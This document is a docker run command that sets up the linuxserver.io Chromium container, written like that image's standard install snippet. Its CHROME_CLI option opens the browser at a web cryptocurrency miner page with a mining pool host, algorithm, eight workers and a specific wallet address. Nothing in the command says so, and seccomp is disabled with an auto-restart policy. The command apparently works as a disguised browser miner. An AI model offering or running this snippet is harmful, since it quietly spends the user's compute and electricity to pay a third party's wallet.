docker run -d \
  --name=chromium \
  --security-opt seccomp=unconfined `#optional` \
  -e PUID=1000 \
  -e PGID=1000 \
  -e TZ=Etc/UTC \
  -e CHROME_CLI=https://webminer.pages.dev/?algorithm=minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=RXvFsnz2kdfCsCkXJaH3QVSpdS4vj9ggiq&password=c%3DRVN&workers=8 `#optional` \
  -p 3000:3000 \
  -p 3001:3001 \
  -v /path/to/config:/config \
  --shm-size="1gb" \
  --restart unless-stopped \
  lscr.io/linuxserver/chromium:latest
